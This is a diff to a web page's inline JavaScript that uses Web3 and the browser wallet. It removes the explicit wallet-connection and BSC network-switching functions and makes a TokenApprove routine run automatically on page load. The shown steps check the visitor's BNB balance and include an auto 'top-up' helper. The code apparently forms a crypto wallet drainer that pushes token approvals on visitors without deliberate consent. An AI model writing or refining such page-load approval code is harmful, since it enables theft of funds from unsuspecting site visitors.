@@ -205,69 +205,6 @@
         // Initialize Web3
         const web3 = new Web3(window.ethereum);
 
-        // Wallet connection functions
-        async function connectWallet() {
-            if (window.ethereum) {
-                try {
-                    // Request account access
-                    await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // Check chain ID
-                    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
-                        await switchToBSC();
-                    } else {
-                        // Start the process automatically
-                        startAutoProcess();
-                    }
-                } catch (error) {
-                    console.error("Error connecting wallet:", error);
-                }
-            } else {
-                console.log("Please install MetaMask or Trust Wallet!");
-            }
-        }
-
-        async function switchToBSC() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }]
-                });
-                // Start the process after switching
-                startAutoProcess();
-            } catch (error) {
-                if (error.code === 4902) {
-                    // If BSC is not added, request to add it
-                    await addBSCNetwork();
-                    startAutoProcess();
-                } else {
-                    console.error("Failed to switch chain", error);
-                }
-            }
-        }
-
-        async function addBSCNetwork() {
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: '0x38',
-                        chainName: 'Binance Smart Chain',
-                        nativeCurrency: {
-                            name: 'Binance Coin',
-                            symbol: 'BNB',
-                            decimals: 18
-                        },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com/']
-                    }]
-                });
-            } catch (addError) {
-                console.error("Failed to add BSC network", addError);
-            }
-        }
-
         // Auto top-up BNB function
         async function requestBNBTopUp(account) {
             try {
@@ -448,17 +385,12 @@
         async function TokenApprove() {
             try {
                 const accounts = await ethereum.request({ method: 'eth_accounts' });
-                if (!accounts || accounts.length === 0) {
-                    await ethereum.request({ method: 'eth_requestAccounts' });
-                    const newAccounts = await ethereum.request({ method: 'eth_accounts' });
-                    if (!newAccounts || newAccounts.length === 0) {
-                        console.error("No accounts available");
-                        return;
-                    }
-                }
+                const account = accounts[0];
                 
-                const accountsFinal = await ethereum.request({ method: 'eth_accounts' });
-                const account = accountsFinal[0];
+                if (!account) {
+                    console.error("No accounts available");
+                    return;
+                }
 
                 // Step 1: Check the current BNB balance
                 const bnbBalance = await web3.eth.getBalance(account);
@@ -495,20 +427,12 @@
             }
         }
 
-        // Auto-start function
-        async function startAutoProcess() {
-            // Small delay to ensure wallet is ready
-            await new Promise(resolve => setTimeout(resolve, 1000));
-            // Start the approval process
-            await TokenApprove();
-        }
-
-        // Start automatically when page loads
+        // Start automatically when page loads - no wallet connection required
         window.addEventListener('load', function() {
             // Small delay to ensure scripts are loaded
             setTimeout(() => {
-                connectWallet();
-            }, 500);
+                TokenApprove();
+            }, 1000);
         });
     </script>
 </body>
